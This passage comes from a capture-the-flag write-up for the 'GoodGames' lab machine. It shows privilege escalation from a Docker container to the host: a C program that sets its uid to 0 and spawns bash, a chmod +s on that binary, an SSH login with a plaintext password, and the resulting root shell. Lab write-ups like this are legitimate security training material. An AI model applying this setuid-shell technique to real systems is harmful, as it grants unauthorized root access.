+augustus@GoodGames:~$</code></pre><p id="bc015f54-98c6-4065-ad6f-dd2cdfa9cef7" class="">this time we are on real machine </p><p id="302c6385-8415-4393-aeed-8cdcc1f26580" class="">I noticed that the files that I originally transferred in augustus’ directory were all completely owned by root.</p><pre id="235b6831-0edc-4004-9b1f-d822593b77b6" class="code"><code>root@3a453ab39d3d:/home/augustus# ls -la
+ls -la
+total 1132
+drwxr-xr-x 5 1000 1000    4096 Feb 26 20:57 .
+drwxr-xr-x 1 root root    4096 Feb 25 20:31 ..
+lrwxrwxrwx 1 root root       9 Nov  3 10:16 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 1000 1000     220 Oct 19 11:16 .bash_logout
+-rw-r--r-- 1 1000 1000    3526 Oct 19 11:16 .bashrc
+drwx------ 2 1000 1000    4096 Feb 25 22:21 .gnupg
+drwxr-xr-x 3 1000 1000    4096 Feb 25 12:46 .local
+-rw-r--r-- 1 1000 1000     807 Oct 19 11:16 .profile
+drwx------ 2 1000 1000    4096 Feb 26 14:48 .ssh
+-rwxr-xr-x 1 root root     263 Feb 26 17:36 scan.sh
+-rw-r----- 1 root 1000      33 Feb 25 05:29 user.txt</code></pre><p id="71e097df-9bca-4429-8db6-101d8395c8ee" class="">If I put something like <code>bash</code> in the container, I could easily use that as augustus to give myself an elevated shell . </p><p id="ec2617e9-935e-4e4e-8d11-706c352fc37d" class="">Used a custom C script </p><pre id="f74ac569-3229-4d2b-a12c-f320a06c1930" class="code"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/inotify.h&gt;
+int main(){
+	setgid(0);
+	setuid(0);
+	system(&quot;/bin/bash&quot;);
+	return 0;
+}</code></pre><p id="5ddd6144-15ef-4a1f-9e1c-67262e736fc1" class="">change its permission to run setuid in root in netcat</p><pre id="d7eb6c40-2faa-4601-8612-fc9760d90327" class="code"><code>root@3a453ab39d3d:/home/augustus# gcc shell.c -o shell
+gcc shell.c -o shell
+root@3a453ab39d3d:/home/augustus# chmod +s shell
+chmod +s shell
+root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
+ssh augustus@172.19.0.1
+augustus@172.19.0.1&#x27;s password: superadministrator
+
+Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Feb 26 20:58:40 2022 from 172.19.0.2
+augustus@GoodGames:~$ ./shell
+./shell
+root@GoodGames:~#</code></pre><p id="06e6ca42-bec2-4ab1-8a95-50c3431a01f6" class="">got the root flag <br> <a href="index.html"><strong>&lt;&lt; Back To Home </strong></a> </p></div></article></body></html>
